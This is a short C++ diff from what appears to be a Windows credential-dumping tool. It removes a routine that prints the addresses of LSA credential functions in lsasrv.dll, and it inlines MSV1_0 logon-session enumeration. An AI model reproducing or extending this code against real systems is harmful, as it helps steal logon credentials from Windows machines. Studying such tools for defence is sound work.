@@ -13,26 +13,6 @@ bool searchMSVFuncs()
 	return (searchLSAFuncs() && (MSV1_0_MspAuthenticationPackageId != 0));
 }
 
-__kextdll bool __cdecl getMSVFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
-{
-	wostringstream monStream;
-	monStream << L"** lsasrv.dll ** ; Statut recherche : " << (searchMSVFuncs() ? L"OK :)" : L"KO :(") << L" - " << MSV1_0_MspAuthenticationPackageId << endl <<
-		L"@GetCredentials     = " << SeckPkgFunctionTable->GetCredentials << endl <<
-		L"@AddCredential      = " << SeckPkgFunctionTable->AddCredential << endl <<
-		L"@DeleteCredential   = " << SeckPkgFunctionTable->DeleteCredential << endl <<
-		L"@LsaUnprotectMemory = " << SeckPkgFunctionTable->LsaUnprotectMemory <<endl <<
-		L"@LsaProtectMemory   = " << SeckPkgFunctionTable->LsaProtectMemory << endl;
-
-	return sendTo(monPipe, monStream.str());
-}
-
-__kextdll bool __cdecl getMSV(mod_pipe * monPipe, vector<wstring> * mesArguments)
-{
-	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
-	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getMSVLogonData, wstring(L"msv1_0")));
-	return getLogonData(monPipe, mesArguments, &monProvider);
-}
-
 bool WINAPI getMSVLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
 {
 	wostringstream maReponse;
@@ -66,7 +46,9 @@ bool WINAPI getMSVLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool
 
 __kextdll bool __cdecl getLogonSessions(mod_pipe * monPipe, vector<wstring> * mesArguments)
 {
-	return getMSV(monPipe, mesArguments);
+	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
+	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getMSVLogonData, wstring(L"msv1_0")));
+	return getLogonData(monPipe, mesArguments, &monProvider);
 }
 
 __kextdll bool __cdecl delLogonSession(mod_pipe * monPipe, vector<wstring> * mesArguments)
